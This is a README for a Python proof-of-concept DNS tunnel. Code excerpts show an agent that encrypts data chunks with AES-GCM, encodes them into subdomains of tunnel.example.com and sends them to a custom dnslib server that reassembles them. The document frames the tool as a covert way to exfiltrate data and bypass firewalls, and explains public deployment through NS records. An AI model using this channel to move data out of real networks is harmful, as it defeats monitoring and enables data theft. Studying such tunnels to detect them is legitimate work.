# 🔒 Secure DNS Tunneling with Symmetric Encryption 🔒

A Python-based implementation of a DNS tunnel that uses **AES-256 GCM** to create a secure and covert communication channel. This project is a proof-of-concept demonstrating how to exfiltrate data securely through DNS queries.

---

## 📊 Architecture Overview

The diagram below illustrates the communication flow between the Agent and the Server.

```mermaid
sequenceDiagram
    participant Agent as 💻 Agent
    participant Server as 🛡️ DNS Server

    Agent->>Agent: 1. Read & Chunk Data
    Agent->>Agent: 2. Encrypt Chunk (AES-GCM)
    Agent->>Agent: 3. Base32 Encode
    Agent->>Server: 4. Send DNS Query<br/>(encoded_chunk.tunnel.example.com)
    Server->>Server: 5. Extract & Base32 Decode
    Server->>Server: 6. Decrypt Chunk (AES-GCM)
    alt ✅ Successful Decryption
        Server-->>Agent: 7. Send ACK<br/>(DNS Response: 1.2.3.4)
    else ❌ Decryption Failed
        Server-->>Agent: 8. No ACK (or error response)
    end
    Agent->>Agent: 9. Receive ACK or Timeout<br/>(Retry if necessary)
```



-----

## 🌟 Core Features

  * **🔒 Secure Communication**: Data is encrypted using military-grade **AES-256 GCM**, ensuring confidentiality and integrity.
  * **🤫 Covert Channel**: Utilizes DNS queries as a hidden communication channel, perfect for bypassing restrictive firewalls.
  * **🔁 Reliable Transmission**: Implements an acknowledgment (ACK) mechanism with automatic retries to ensure data arrives.
  * **🛡️ Data Integrity**: Leverages AES-GCM's built-in authentication tag to verify that data has not been tampered with in transit.
  * **📦 Smart Chunking**: Automatically splits large messages or files into smaller chunks for transmission and reassembles them on the server.
  * **🔢 Sequence Numbering**: Embeds a sequence number in each chunk to guarantee correct message order and prevent replay attacks.

-----

## 🛠️ Implementation Details

### 1\. Cryptography Implementation (Crypto Module)

The `crypto_module.py` manages all encryption and decryption using the `PyCryptodome` library. It implements AES-256 in GCM mode, providing strong confidentiality along with data authentication and integrity.

  * **AES-256 GCM**: Data is encrypted using a 32-byte shared key. GCM mode ensures that the data's confidentiality is protected, and also provides an authentication tag to verify that the data has not been tampered with.

    ```python
    # From crypto_module.py
    from Crypto.Cipher import AES

    class AESCipher:
        def __init__(self, key: bytes):
            # ... key validation ...
            self.key = key

        def encrypt(self, plaintext: bytes):
            cipher = AES.new(self.key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return {'ciphertext': ciphertext, 'nonce': cipher.nonce, 'tag': tag}

        def decrypt(self, ciphertext: bytes, nonce: bytes, tag: bytes):
            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)
    ```

      * **Explanation**: The `encrypt` method generates a unique `nonce` and an `authentication tag` along with the `ciphertext`. The `decrypt` method uses these to verify the data's integrity and then decrypts it. Any alteration to the data or tag will cause decryption to fail.

### 2\. DNS Tunneling Implementation (Agent and Server)

The core logic for sending and receiving data via DNS queries is handled in `agent.py` and `server.py`.

#### Agent (`agent.py`)

The Agent splits data into small chunks, encrypts and encodes them, and then sends them as DNS queries.

  * **Data Preparation**: The Agent splits the input message into chunks of `CHUNK_SIZE` (30 bytes). Each chunk is then encrypted, and the resulting `nonce`, `tag`, and `ciphertext` are concatenated into a single packet.

    ```python
    # From agent.py
    CHUNK_SIZE = 30 # Max size of data per chunk in bytes

    def split_data(data: bytes, size: int):
        return [data[i:i+size] for i in range(0, len(data), size)]

    def send_chunk_with_ack(chunk: bytes, seq: int):
        encrypted = cipher.encrypt(chunk)
        packet = encrypted['nonce'] + encrypted['tag'] + encrypted['ciphertext']
        # ... rest of the function ...
    ```

  * **DNS Query Formatting**: The packet (containing encrypted data, nonce, and tag) is Base32 encoded. This encoded string, along with a sequence number, forms a subdomain of the tunnel's `DOMAIN`.

    ```python
    # From agent.py
    DOMAIN = "tunnel.example.com"

    def build_label(seq: int, encrypted: bytes) -> str:
        encoded = base64.b32encode(encrypted).decode().strip('=').lower()
        # Splits into multiple labels if needed (max 63 chars per label)
        labels = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
        return f"seq{seq}." + ".".join(labels) + f".{DOMAIN}"
    ```

  * **Sending and Acknowledgment**: The Agent sends an A record DNS query to the specified `SERVER_IP` and `SERVER_PORT`. It expects an A record response (`RESPONSE_IP`) as an acknowledgment from the Server. If no ACK is received, it retries up to `MAX_RETRIES` times.

    ```python
    # From agent.py
    MAX_RETRIES = 3

    def send_dns_query(label: str) -> bool:
        try:
            query = dns.message.make_query(label, dns.rdatatype.A)
            response = dns.query.udp(query, '127.0.0.1', port=5353, timeout=2)
            for answer in response.answer:
                if answer.rdtype == dns.rdatatype.A:
                    return True # ACK received
            return False
        except Exception as e:
            print(f"❌ DNS error for {label}: {e}")
            return False
    ```

#### Server (`server.py`)

The Server runs a custom DNS resolver that intercepts queries for the tunnel domain, extracts and decrypts the data, and sends back acknowledgments.

  * **Custom DNS Resolver**: The Server uses `dnslib` to run a custom DNS server. Its `resolve` method is called for incoming queries.

    ```python
    # From server.py
    from dnslib.server import DNSServer, BaseResolver
    from dnslib import RR, QTYPE, A

    class DNSAgentResolver(BaseResolver):
        def resolve(self, request, handler):
            qname = str(request.q.qname).rstrip('.')
            # ... rest of the resolve logic ...

    def start_dns_server():
        resolver = DNSAgentResolver()
        server = DNSServer(resolver, port=5353, address="127.0.0.1", tcp=False)
        server.start_thread()
        # ... server loop ...
    ```

  * **Data Extraction and Decryption**: The Server extracts the sequence number and Base32 encoded data from the received DNS query's subdomain. It then decodes the Base32 string, separates the `nonce`, `tag`, and `ciphertext`, and decrypts the data using the `crypto_module`.

    ```python
    # From server.py (inside DNSAgentResolver.resolve method)
    # ... extraction of seq_num and encoded_data ...
    padded = encoded_data.upper() + '=' * (-len(encoded_data) % 8)
    full_packet = base64.b32decode(padded)

    nonce = full_packet[:16]
    tag = full_packet[16:32]
    ciphertext = full_packet[32:]

    plaintext = cipher.decrypt(ciphertext, nonce, tag)
    # ... storage of plaintext chunk ...
    ```

  * **Acknowledgment and Reconstruction**: For every successfully processed chunk, the Server sends an A record DNS response (`RESPONSE_IP`) as an ACK. Upon shutdown (e.g., `Ctrl+C`), it reconstructs the full message from all received chunks, sorted by sequence number.

    ```python
    # From server.py (inside DNSAgentResolver.resolve method)
    RESPONSE_IP = "1.2.3.4"
    reply = request.reply()
    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, rclass=1, ttl=60, rdata=A(RESPONSE_IP)))
    return reply

    # From server.py (inside KeyboardInterrupt handler in start_dns_server)
    message = b''.join([received_chunks[i] for i in sorted(received_chunks)])
    print(f"\n## --- Reconstructed Message ---\n{message.decode(errors='ignore')}\n")
    # ... missing chunks report ...
    ```

-----

## 🛠️ Setup and Configuration

### Prerequisites

To run the project, ensure you have the following installed:

  * 🐍 Python 3.x
  * 📦 `dnspython` library
  * 📦 `dnslib` library
  * 📦 `pycryptodome` library

You can install all dependencies with a single command:

```bash
pip install dnspython dnslib pycryptodome
```

### Project Structure

```
.
├── 📁 agent.py
├── 📁 server.py
├── 📁 crypto_module.py
└── 📄 README.md
```

### Configuration Parameters

All configuration is done via constants at the top of the respective Python files.

| Parameter | File(s) | Description | Default Value / Example |
| :--- | :--- | :--- | :--- |
| **`SHARED_KEY`** | `agent.py`, `server.py`, `crypto_module.py` | The **32-byte (256-bit) symmetric key**. Must be identical across all files. | `b"0123456789ABCDEF0123456789ABCDEF"` |
| **`DOMAIN`** | `agent.py`, `server.py` | The base domain for the DNS tunnel. | `'tunnel.example.com'` |
| **`CHUNK_SIZE`** | `agent.py` | Max size (in bytes) of raw data per chunk. | `30` |
| **`MAX_RETRIES`** | `agent.py` | Number of send attempts per chunk before failing. | `3` |
| **`SERVER_IP`** | `agent.py`, `server.py` | IP address for the DNS server to run on / connect to (e.g., `127.0.0.1` for local testing). | `'127.0.0.1'` |
| **`SERVER_PORT`**| `agent.py`, `server.py` | Port for the DNS server (e.g., `5353` for local testing). | `5353`                           |

-----

## 🚀 Usage Guide

### 1\. Launch the Server

Open a terminal and run `server.py`. The server will start listening for DNS queries.

```bash
python server.py
```

> ```
> 🛡️ DNS Tunnel Server running on 127.0.0.1:5353...
> 📡 Listening for data on domain: tunnel.example.com
> ```

### 2\. Run the Agent

In a **new terminal**, run `agent.py`. It will prompt for your message.

```bash
python agent.py
```

> ```
> Enter your secret message: This is a highly confidential message that will be tunneled over DNS.
> ```

### 3\. Watch the Magic Happen\!

The agent will show its progress, and the server will show received chunks.

**💻 Agent Output:**

> ```
> 🔹 Sending chunk 0, try 1...
> ✅ ACK received for chunk 0
> 🔹 Sending chunk 1, try 1...
> ✅ ACK received for chunk 1
> 🔹 Sending chunk 2, try 1...
> ✅ ACK received for chunk 2
> ✨ All chunks sent and acknowledged successfully!
> ```

**🛡️ Server Output:**

> ```
> ✅ Received chunk 0: b'This is a highly confidentia'
> ✅ Received chunk 1: b'l message that will be tunn'
> ✅ Received chunk 2: b'eled over DNS.'
> ```

### 4\. View the Reconstructed Message

Stop the server (`Ctrl+C`). It will automatically reassemble and display the complete message.

> ```
> ⚠️  Shutting down... rebuilding message:
> ```

> ```
> --- Reconstructed Message ---
> This is a highly confidential message that will be tunneled over DNS.
> ```

> ```
> ✅ Received chunks: [0, 1, 2]
> ✅ All chunks received successfully.
> ```

-----

## ⚠️ Important Considerations

  * **🚨 Security**: The `SHARED_KEY` is hardcoded for this example. In a real-world scenario, the key **must not be hardcoded**. Use a secure key exchange mechanism (like Diffie-Hellman) or pre-share it via a secure out-of-band channel.
  * **🌐 Network**: The agent is configured for a local server (`127.0.0.1`). For use over the internet, you must run `server.py` on a public server and configure your domain's NS records to point to that server's IP address.
  * **🕵️‍♂️ Stealth**: While DNS tunneling can bypass simple firewalls, it is **not invisible**. Network traffic analysis and Intrusion Detection Systems (IDS) can flag the unusual DNS patterns (e.g., high-entropy subdomains, high query frequency) generated by this tool.

-----